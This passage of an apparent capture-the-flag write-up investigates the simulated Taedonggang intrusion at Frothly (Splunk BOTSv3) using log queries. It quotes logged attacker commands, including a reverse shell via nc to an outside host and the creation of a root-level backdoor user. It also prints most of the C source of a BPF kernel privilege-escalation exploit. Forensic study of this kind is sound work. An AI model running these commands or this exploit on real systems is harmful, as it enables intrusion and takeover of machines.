A [VirusTotal](https://www.virustotal.com/gui/file/99925199059ee049f7aeda8904c2f5bdfba86671fd7a5989bd60b72f26ef737c/detection) lookup of the SHA256 hash confirms it is flagged as a hacking tool. However, there are no known public reports or attribution from other OSINT sources, further suggesting that this is a custom/private tool used exclusively by the attacker group.

>ANSWER: `586EF56F4D8963DD546163AC31C865D7`
{: .prompt-info }

#### Question 34 (308): Based on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised? Answer guidance: Comma separated without spaces, in alphabetical order.
During the previous investigation, we confirmed that the threat actor created a new local user named `svcvnc` on Fyodor's endpoint using the following commands:

**Evidences**

```powershell
"C:\Windows\system32\net.exe" user /add svcvnc Password123!      

"C:\Windows\system32\net.exe" localgroup administrators svcvnc /add     
```

To verify what groups this user was assigned to, we queried the Windows Security Event Logs.

```sql
index=botsv3 sourcetype=wineventlog source=WinEventLog:Security
AND svcvnc
|reverse
|stats count by Group_Domain Group_Name
|sort + Group_Name
```

| Group_Domain | Group_Name     | count |
| ------------ | -------------- | ----- |
| Builtin      | Administrators | 1     |
| FYODOR-L     | None           | 1     |
| Builtin      | Users          | 1     |


As shown above, the `svcvnc` user was added to Administrators. Although this is a minimal group assignment, being a member of the Administrators group grants full control over the endpoint, more than sufficient for the attacker’s objectives.

>ANSWER: `administrators, users`
{: .prompt-info }

#### Question 35 (309): At some point during the attack, a user's domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: jdoe@mycompany.com,tmiller@mycompany.com)

This question connects back to [Question 301](https://phamthanhsang-cs.site/posts/BOTSV3/#question-27-301-what-external-client-ip-address-is-able-to-initiate-successful-logins-to-frothly-using-an-expired-user-account), where we analyzed Fyodor's Azure account and confirmed he is the Frothly domain administrator.

To identify account disablement events, we searched for activities where Fyodor disabled a user account in Azure AD logs.

```sql
index=botsv3 sourcetype=ms:aad:audit AND fyodor@froth.ly
AND activity="Disable account"
|reverse
```

**Indexed Time: 8/20/18 9:47:12.515 PM**

```json
{
  "category": "Core Directory",
  "tenantGeolocation": null,
  "activityDate": "2018-08-20T14:47:12.5151783Z",
  "domainName": null,
  "targets": [
    {
      "@odata.type": "#Microsoft.ActiveDirectory.DataService.PublicApi.Model.Reporting.AuditLog.TargetResourceUserEntity",
      "isPrivileged": null,
      "name": null,
      "objectId": "d85d399c-9cb6-480f-8789-88cbf56e3764",
      "userSource": null,
      "userPrincipalName": "bgist@froth.ly",
      "modifiedProperties": [
        {
          "newValue": "[false]",
          "name": "AccountEnabled",
          "oldValue": "[true]"
        },
        {
          "newValue": "\"AccountEnabled\"",
          "name": "Included Updated Properties",
          "oldValue": null
        }
      ],
      "puid": "10033FFFA361A98C",
      "targetResourceType": "User",
      "ipAddress": null,
      "additionalDetails": null
    }
  ],
  "activityType": "User",
  "actorType": "User",
  "internalCorrelationId": null,
  "actor": {
    "@odata.type": "#Microsoft.ActiveDirectory.DataService.PublicApi.Model.Reporting.AuditLog.ActorUserEntity",
    "puid": "1003BFFDA2E71FF9",
    "name": null,
    "objectId": "18af02a7-8541-4209-9dd5-600ab965d8a7",
    "servicePrincipalName": null,
    "userPrincipalName": "fyodor@froth.ly",
    "ipAddress": "<null>"
  },
  "source": null,
  "activityDateInMillis": 1534776432515,
  "tenantName": null,
  "tenantId": "225e05a1-5914-4688-a404-7030e60f3143",
  "activity": "Disable account",
  "activityResultStatus": "Success",
  "componentOrSource": null,
  "activityResultDescription": "",
  "additionalDetails": [],
  "id": "Directory_FE2NN_24703906",
  "activityOperationType": "Update",
  "correlationId": "d6d25f06-d091-4aa5-8826-6081a3a25525"
}
```

The following audit event confirms the action:
- Timestamp: 2018-08-20T14:47:12Z
- Actor (Disabler): fyodor@froth.ly
- Target (Disabled User): bgist@froth.ly
- Action: Disable account
- Result: Success

This action likely occurred after the **incident had been fully detected**, suggesting that the real Fyodor logged in and disabled Bruce's (`bgist@froth.ly`) compromised account to stop further misuse.

>ANSWER: `bgist@froth.ly,fyodor@froth.ly`
{: .prompt-info }

#### Question 36 (310): Another set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file? Answer guidance: Include the file extension. (Example: badfile.docx)

![pic52](assets/images/botsv3/pic52.svg)

This is a direct continuation of the investigation discussed in [Question 302](https://phamthanhsang-cs.site/posts/BOTSV3/#question-28-302-according-to-symantecs-website-what-is-the-discovery-date-of-the-malware-identified-in-the-macro-enabled-file-answer-guidance-provide-the-us-date-format-mmddyy-example-january-1-2019-should-be-provided-as-010119)

After gaining a foothold on a Frothly endpoint, the threat actor sent out another round of phishing emails. The digital artifact left behind was a macro-enabled Excel document clearly used as part of the phishing campaign. The document was detected and recorded in system logs.

> ANSWER: `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm`
{: .prompt-info }


#### Question 37 (311): Based on the answer to question 310, what is the name of the executable that was embedded in the malware? Answer guidance: Include the file extension. (Example: explorer.exe)

This question builds on the previous one and refers to the process responsible for interacting with or triggering the malicious Excel file.

```xml
<Event
	xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
	<System>
		<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
		<EventID>11</EventID>
		<Version>2</Version>
		<Level>4</Level>
		<Task>11</Task>
		<Opcode>0</Opcode>
		<Keywords>0x8000000000000000</Keywords>
		<TimeCreated SystemTime='2018-08-20T09:55:52.450060800Z'/>
		<EventRecordID>36035</EventRecordID>
		<Correlation/>
		<Execution ProcessID='3516' ThreadID='5172'/>
		<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
		<Computer>BGIST-L.froth.ly</Computer>
		<Security UserID='S-1-5-18'/>
	</System>
	<EventData>
		<Data Name='UtcTime'>2018-08-20 09:55:52.449</Data>
		<Data Name='ProcessGuid'>{EBF7A186-B00B-5B58-0000-0010CC954200}</Data>
		<Data Name='ProcessId'>10096</Data>
		<Data Name='Image'>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe</Data>
		<Data Name='TargetFilename'>C:\Users\BruceGist\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm</Data>
		<Data Name='CreationUtcTime'>2018-08-20 09:55:52.449</Data>
	</EventData>
</Event>
```

>ANSWER: `HxTsr.exe`
{: .prompt-info }

#### Question 38 (312): How many unique IP addresses "used" the malicious link file that was sent?

From previous investigations, we confirmed that the adversary uploaded a malicious .lnk file named:

>**`BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`**

Threat actor uploaded it to SharePoint, then distributed the link to Frothly employees via phishing emails. The `.lnk` file was hosted alongside photos to make it seem legitimate.

To track this, Microsoft 365 audit logs - [Audit Logs Activities](https://learn.microsoft.com/en-us/purview/audit-log-activities#sharing-and-access-request-activities) expose a special operation called `AnonymousLinkUsed`, which records when unauthenticated (or guest) access is made via a shared link.

![pic57](assets/images/botsv3/pic57.png)

```sql
index=botsv3 sourcetype=ms:* "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk" AND AnonymousLinkUsed
|reverse
```
While Splunk suggested 7 IPs accessed the link, further host-based telemetry analysis via Sysmon Event ID 11 (file creation) reveals a richer context:


| host      | EventCode | TargetFilename                                                                                                                                                 |
| --------- | --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PCERF-L   | 11        | C:\Users\PeatCerf\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.skvafh7.partial          |
| PCERF-L   | 11        | C:\Users\PeatCerf\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.yq6fawq.partial                                                                                 |
| MKRAEUS-L | 11        | C:\Users\MalloryKraeusen\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.ylo9t7m.partial   |
| JWORTOS-L | 11        | C:\Users\JeremiahWortoski\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.0gkq09g.partial  |
| FYODOR-L  | 11        | C:\Users\FyodorMalteskesko\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.gapi8f2.partial |
| BTUN-L    | 11        | C:\Users\BillyTun\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.95m2mg1.partial          |
| BSTOLL-L  | 11        | C:\Users\BudStoll\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.3yekbvr.partial          |
| BSTOLL-L  | 11        | C:\Users\BudStoll\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.3tgpnzb.partial          |
| BGIST-L   | 11        | C:\Users\BruceGist\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.cjsmkqj.partial         |
| ABUNGST-L | 11        | C:\Users\AlBungstein\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.0w0hj03.partial       |

So although 8 hosts touched the file, one of them (BGIST-L) was the source of the file, not a victim who executed it.

By isolating actual victim-side usage, we determine that 7 unique systems accessed or executed the `.lnk` file, each assumed to be using a unique IP address (based on host telemetry and enterprise context).

> ANSWER: `7`
{: .prompt-info }

#### Question 39 (314): What port number did the adversary use to download their attack tools?

Since we already identified the main IP address of the threat actor's infrastructure - `45.77.53.176`, the next step is to look at FYODOR-L's network activity. To do that, I examined Sysmon EventCode 3, which tracks network connections:

```sql
index=botsv3 sourcetype=xmlwineventlog
AND EventCode=3 AND 45.77.53.176  AND host=FYODOR-L  AND earliest="08/20/2018:16:58:40"
|stats count by DestinationPort
```

![pic58](assets/images/botsv3/pic58.png)

Most of the returned results were high ephemeral ports typically used for C2 traffic (EmpireC2 in this case), but there was one interesting hit on port 3333, which definitely stood out.

To dig deeper into what happened over that port, I checked the HTTP proxy logs for traffic between `FYODOR-L` and the attacker's server on port 3333:

```sql
index=botsv3 sourcetype=stream:http AND 45.77.53.176 AND 3333 |reverse
```
Only two events came back, but they revealed quite a bit:

```json
{
  "endtime": "2018-08-20T10:47:16.891201Z",
  "timestamp": "2018-08-20T10:47:05.742156Z",
  "bytes": 5542317,
  "src_mac": "00:0C:29:55:51:1A",
  "src_port": 64104,
  "bytes_in": 177,
  "dest_ip": "45.77.53.176",
  "dest_mac": "00:50:56:E3:C7:18",
  "dest_port": 3333,
  "bytes_out": 5542140,
  "time_taken": 11149728,
  "transport": "tcp",
  "flow_id": "e8947e90-2f4b-48eb-93e8-f0099d8f8188",
  "src_ip": "192.168.70.186",
  "http_comment": "HTTP/1.1 200 OK",
  "http_content_length": 5782482,
  "http_content_type": "image/png",
  "site": "45.77.53.176:3333",
  "http_method": "GET",
  "status": 200,
  "uri_path": "/images/logos.png",
  "http_user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112",
  "protocol_stack": "ip:tcp:http"
}
```

So, the threat actor used **PowerShell** to download a file named `logos.png` from port 3333. Although the extension says `.png`, the file size (over 5MB) and method used (PowerShell).

This port was only used once and there wasn't any event relate to the `logos.png`, which, for me, unsatisfied and really lacked of contexts.

>ANSWER: `3333`
{: . prompt-info }

#### Question 40 (315): During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files? Answer guidance: Comma separated without spaces, in alphabetical order, include the file extension where applicable.

Back to **Question 303**, during the investigation into the threat actor's activity on `FYODOR-L`, we observed clear signs of lateral movement. The attacker successfully connected to a remote Linux server at `192.168.9.30:8080` using a masqueraded tool named `iexexplorer.exe`.

**Evidences**

```bash
whoami
id
groups
cat /etc/passwd
useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com
uname -a
lsb_release -a
echo LyoKICogVWJ1bnR1IDE2LjA0LjQga2VybmVsIHByaXYgZXN...>> /tmp/colonel
ls -lf /tmp
base64 --decode /tmp/colonel > /tmp/colonel.c
cat /tmp/colonel.c
md5sum /tmp/colonel.c
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe && nc 45.77.53.176 8088 1>/tmp/backpipe
```

There were two payloads dropped by the threat actor:
- One encoded using base64 and saved as `/tmp/colonel`
- Another encoded base64 payload saved as `/tmp/definitelydontinvestigatethisfile.sh`

The first one was already partially visible in previous logs, but the second wasn’t logged properly by Sysmon. So I searched in other relevant sourcetypes, which led me to EventCode 4688 from `wineventlog` (Windows process creation logs).


```sql
index=botsv3 sourcetype=wineventlog host=FYODOR-L 
AND earliest="08/20/2018:18:00:00" AND echo 
|reverse
```
The query returned 4 events, one of which showed the full second payload being echoed:

```bash
echo /9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSgBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoK...>> /tmp/definitelydontinvestigatethisfile.sh
```

After decoding both base64 payloads, I found:
- `colonel` contained a privilege escalation exploit targeting Ubuntu 16.04.4, written in C, abusing the BPF subsystem to modify kernel memory and set UID to 0 (root).
- `definitelydontinvestigatethisfile.sh` was just a base64-encoded image, likely dropped as a decoy to confuse competitors - like it's name (It was funny af tho!).

```c
/*
 * Ubuntu 16.04.4 kernel privilege escalation exploit
 * Credits to @bleidl
 * - vnik
 */

// Tested kernel version: 4.4.0-116-generic
// Adjust offsets if running on different kernels

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>        // BPF subsystem (Berkeley Packet Filter)
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

// Memory layout and structure offsets
#define PHYS_OFFSET 0xffff880000000000  // Start of kernel address space
#define CRED_OFFSET 0x5f8               // Offset of cred struct in task_struct
#define UID_OFFSET 4                    // Offset of UID in cred struct
#define LOG_BUF_SIZE 65536              // Buffer size for BPF log
#define PROGSIZE 328                    // Length of BPF program

int sockets[2];                         // UNIX socket pair
int mapfd, progfd;                      // File descriptors for BPF map and program

// Raw BPF bytecode that interacts with kernel memory
char * __prog = "\xb4\x09\x00\x00\xff\xff\xff\xff" /* ... (truncated for brevity) */
"\x95\x00\x00\x00\x00\x00\x00\x00";

// Buffer for BPF verifier logs
char bpf_log_buf[LOG_BUF_SIZE];

// Load a BPF program into the kernel
static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version) {
    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (__u64)insns,
        .insn_cnt = prog_len / sizeof(struct bpf_insn),
        .license = (__u64)license,
        .log_buf = (__u64)bpf_log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };
    attr.kern_version = kern_version;
    bpf_log_buf[0] = 0;
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

// Create a BPF map for communication between userland and BPF program
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

// Update an entry in the BPF map
static int bpf_update_elem(uint64_t key, uint64_t value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)&key,
        .value = (__u64)&value,
        .flags = 0,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// Read an entry from the BPF map
static int bpf_lookup_elem(void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)key,
        .value = (__u64)value,
    };
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

// Exit with error message
static void __exit(char *err) {
    fprintf(stderr, "error: %s\n", err);
    exit(-1);
}

// Set up BPF program and socket pair for exploitation
static void prep(void) {
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
    if (mapfd < 0)
        __exit(strerror(errno));

    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);
    if (progfd < 0)
        __exit(strerror(errno));

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
        __exit(strerror(errno));

    if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
        __exit(strerror(errno));
}

// Trigger BPF program by writing to socket
static void writemsg(void) {
    char buffer[64];
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    if (n < 0) {
        perror("write");
        return;
    }
    if (n != sizeof(buffer))
        fprintf(stderr, "short write: %lu\n", n);
}

// Macro to update BPF map and trigger BPF exec
#define __update_elem(a, b, c) \
    bpf_update_elem(0, (a)); \
    bpf_update_elem(1, (b)); \
    bpf_update_elem(2, (c)); \
    writemsg();

// Get value from key 2 in BPF map
static uint64_t get_value(int key) {
    uint64_t value;
    if (bpf_lookup_elem(&key, &value))
        __exit(strerror(errno));
    return value;
}

// Leak frame pointer (fp) from kernel stack
static uint64_t __get_fp(void) {
    __update_elem(1, 0, 0);
    return get_value(2);
}

// Read arbitrary kernel memory via BPF
static uint64_t __read(uint64_t addr) {
    __update_elem(0, addr, 0);
    return get_value(2);
}

// Write arbitrary kernel memory via BPF
static void __write(uint64_t addr, uint64_t val) {
    __update_elem(2, addr, val);
}

// Align stack pointer to page boundary (kernel stack page)
static uint64_t get_sp(uint64_t addr) {
    return addr & ~(0x4000 - 1);
}

// Main exploitation logic
static void pwn(void) {
    uint64_t fp, sp, task_struct, credptr, uidptr;

    // Step 1: Leak frame pointer
    fp = __get_fp();
    if (fp < PHYS_OFFSET)
        __exit("bogus fp");

    // Step 2: Derive stack pointer
    sp = get_sp(fp);
    if (sp < PHYS_OFFSET)
        __exit("bogus sp");

    // Step 3: Read task_struct from kernel stack
    task_struct = __read(sp);
    if (task_struct < PHYS_OFFSET)
        __exit("bogus task ptr");

    printf("task_struct = %lx\n", task_struct);

    // Step 4: Locate cred struct
    credptr = __read(task_struct + CRED_OFFSET);
    if (credptr < PHYS_OFFSET)
        __exit("bogus cred ptr");

    // Step 5: Set UID to 0 (root)
    uidptr = credptr + UID_OFFSET;
    if (uidptr < PHYS_OFFSET)
        __exit("bogus uid ptr");

    printf("uidptr = %lx\n", uidptr);
    __write(uidptr, 0);  // Overwrite UID (and likely GID) with 0

    // Step 6: Verify and spawn root shell
    if (getuid() == 0) {
        printf("spawning root shell\n");
        system("/bin/bash");
        exit(0);
    }

    __exit("not vulnerable?");
}

int main(int argc, char **argv) {
    prep();  // Setup BPF program and socket
    pwn();   // Launch exploit
    return 0;
}
```

![pic59](assets/images/botsv3/pic59.jpg)
_That was hilarious xD_

>ANSWER: `colonel,definitelydontinvestigatethisfile.sh`
{: .prompt-info }

#### Question 41 (316): Based on the information gathered for question 314, what file can be inferred to contain the attack tools? Answer guidance: Include the file extension.

Just a following question from [Question 314](https://phamthanhsang-cs.site/posts/BOTSV3/#question-39-314-what-port-number-did-the-adversary-use-to-download-their-attack-tools).

Proxy Logs captured all details of the event.

```json
{
  "endtime": "2018-08-20T10:47:16.891201Z",
  "timestamp": "2018-08-20T10:47:05.742156Z",
  "bytes": 5542317,
  "src_mac": "00:0C:29:55:51:1A",
  "src_port": 64104,
  "bytes_in": 177,
  "dest_ip": "45.77.53.176",
  "dest_mac": "00:50:56:E3:C7:18",
  "dest_port": 3333,
  "bytes_out": 5542140,
  "time_taken": 11149728,
  "transport": "tcp",
  "flow_id": "e8947e90-2f4b-48eb-93e8-f0099d8f8188",
  "src_ip": "192.168.70.186",
  "http_comment": "HTTP/1.1 200 OK",
  "http_content_length": 5782482,
  "http_content_type": "image/png",
  "site": "45.77.53.176:3333",
  "http_method": "GET",
  "status": 200,
  "uri_path": "/images/logos.png",
  "http_user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112",
  "protocol_stack": "ip:tcp:http"
}
```

>ANSWER: `logos.png`
{: .prompt-info }

#### Question 42 (317): What is the first executable uploaded to the domain admin account's compromised endpoint system? Answer guidance: Include the file extension.

Back to threat actor's activities from previous investigation, i could see easily the firstest tools uploaded and has been used by them was the Customized Network Scanner tool - `hdoor.exe`.

| @timestamp              | CommandLine                                                                                                                                                                                     | Note                                                       |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| 2018-08-20 17:01:41     | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBpA...`                                                                  | First suspicious PowerShell execution appeared             |
| 2018-08-20 17:07:03     | `"C:\Windows\system32\whoami.exe" /groups`                                                                                                                                                      | Executed group enumeration                                 |
| 2018-08-20 17:08:17     | `"C:\Windows\system32\net.exe" user /add svcvnc Password123!`                                                                                                                                   | Created a new user on the host                             |
| 2018-08-20 17:08:35     | `"C:\Windows\system32\net.exe" localgroup administrators svcvnc /add`                                                                                                                           | Added user to Administrators group                         |
| 2018-08-20 17:09:44     | `"C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c...`                 | Created scheduled task for persistence                     |
| 2018-08-20 17:23:37     | `"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe"`                                                                                                           | Connect to Cisco VPN                                       |
| 2018-08-20 17:40:57     | `"C:\Windows\system32\NETSTAT.EXE" -an`                                                                                                                                                         | Performed network enumeration using Netstat                |
| **2018-08-20 17:43:10** | **`"C:\windows\temp\hdoor.exe" -hbs 192.168.9.1-192.168.9.50 /b /m /n`**                                                                                                                        | **Scanned internal network using a suspicious executable** |
| 2018-08-20 17:46:29     | `"C:\Windows\system32\netsh.exe" advfirewall set allprofiles state off`                                                                                                                         | Disabled Windows Firewall using netsh                      |
| 2018-08-20 18:05:40     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami`                                                                         | Executed `whoami` on a remote server                       |
| 2018-08-20 18:06:01     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action id`                                                                             | Executed `id` on a remote server                           |
| 2018-08-20 18:06:20     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action groups`                                                                         | Executed `groups` on a remote server                       |
| 2018-08-20 18:06:38     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "cat /etc/passwd"`                                                              | Retrieved `/etc/passwd` from remote server                 |
| 2018-08-20 18:07:03     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com"`          | Created a privileged user on the remote server             |
| 2018-08-20 18:07:27     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "uname -a"`                                                                     | Executed `uname -a` on a remote server                     |
| 2018-08-20 18:07:46     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "lsb_release -a"`                                                               | Executed `lsb_release -a` on a remote server               |
| 2018-08-20 18:08:36     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "echo LyoKICogVWJ1bnR1IDE2LjA0LjQga2VybmVsIHByaXYgZXN...&gt;&gt; /tmp/colonel"` | Wrote base64-encoded payload to `/tmp/colonel`             |
| 2018-08-20 18:10:13     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "ls -lf /tmp"`                                                                  | Listed contents of `/tmp` directory                        |
| 2018-08-20 18:10:55     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "base64 --decode /tmp/colonel &gt; /tmp/colonel.c"`                             | Decoded base64 payload into C source file `/tmp/colonel.c` |
| 2018-08-20 18:11:27     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "cat /tmp/colonel.c"`                                                           | Displayed contents of `/tmp/colonel.c`                     |
| 2018-08-20 18:11:45     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "md5sum /tmp/colonel.c"`                                                        | Checked MD5 hash of the payload source file                |
| 2018-08-20 18:12:51     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "mknod /tmp/backpipe p"`                                                        | Created named pipe (`backpipe`) as a communication channel |
| 2018-08-20 18:13:56     | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "/bin/sh 0&lt;/tmp/backpipe && nc 45.77.53.176 8088 1&gt;/tmp/backpipe"`        | Established backdoor to threat actor C2 via reverse shell  |

Another noteworthy thingy is the second tool which is `C:\windows\temp\unziped\lsof-master\iexeplorer.exe`, been used to run remote code to the remote server via specific path `/showcase.action` - This evidence really interesting to explore the reason why threat actor could move laterally to the remote server, without SSH into it 

>ANSWER: `hdoor.exe`
{: .prompt-info }

#### Question 43 (318): From what country is a small brute force or password spray attack occurring against the Frothly web servers?
This question isn’t directly tied to previous ones, so I skipped it.

The keyword to focus on here is `sshd`. One specific IP address was seen attempting a small brute force attack over port 22 (SSH) against Frothly’s public-facing web server, which is hosted at `www.brewertalk.com` (`172.16.0.178`).

Surprisingly, Frothly exposed SSH directly to the internet, no VPN or jump box in place to filter access :(

> ANSWER: `Russia`
{: .prompt-info }

#### Question 44 (319): The adversary created a BCC rule to forward Frothly's email to his personal account. What is the value of the "Name" parameter set to?
This brings us back to Question 300, where I explored Frothly’s Microsoft 365 environment and noted an interesting field: `BlindCopyTo`.

```sql
index=botsv3 sourcetype=o365:management:activity
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|fields field value
|where isnotnull(value)
```
| fields        | value                |
| ------------- | -------------------- |
| `BlindCopyTo` | hyunki1984@naver.com |

This clearly indicates that **Taedonggang** established an email forwarding rule, silently BCC’ing messages to their own address. The condition used to trigger this rule matched terms: `cromdale OR beer OR financial OR secret` which is a common exfiltration pattern used by adversaries to target sensitive keywords.

To investigate further.

```sql
index=botsv3 sourcetype=o365:management:activity AND hyunki1984@naver.com
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|fields field value
|where isnotnull(value)
```

To take overview of this, i prefer you to see my Splunk generated report -> [Click here to see the suspicious_mail.pdf](https://github.com/phamthanhsang-cs/phamthanhsang-cs.github.io/blob/main/assets/images/botsv3/suspicous_mail.pdf)

>ANSWER: `SOX`
{: .prompt-info }

#### Question 45 (320): What is the password for the user that was created on the compromised endpoint?

I wont talk about this one xD ! If you know it, you know it.

```powershell
"C:\Windows\system32\net.exe" user /add svcvnc Password123!      

"C:\Windows\system32\net.exe" localgroup administrators svcvnc /add     
```

>ANSWER: `Password123!`
{: .prompt-info }

#### Question 46 (321): The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?

Since we had already collected the threat actor's email address, used to exfiltrate Frothly's intellectual property, we were able to trace events related to that specific email.

```sql
|metasearch index=botsv3 sourcetype=* hyunki1984
|stats count by sourcetype
|sort - count
```

| sourcetype                     | count |
| ------------------------------ | ----- |
| ms:o365:reporting:messagetrace | 84    |
| **stream:smtp**                | 2     |
| ms:o365:management             | 1     |
| o365:management:activity       | 1     |

Among these, the most valuable sourcetype was `stream:smtp`, indicating that this email had actual SMTP conversations within Frothly’s environment.

```sql
index=botsv3 sourcetype=stream:smtp AND hyunki1984
|reverse
```

Since there were only two events, I was able to manually review the contents. The email conversations were initiated by **HyunKi Kim** (`hyunki1984@naver.com`), who sent a message to **Grace Hoppy** (`ghoppy@froth.ly`), claiming that Frothly's data had been stolen and published at `https://pastebin.com/sdBUkwsE`. Grace then CC'd other members and confirmed whether this was a legitimate incident.

The threat actor also included a screenshot of an internal chat between Grace and Billy, in which Grace accused Bruce of being lazy. The image was embedded as a base64-encoded attachment and later extracted by me using CyberChef.

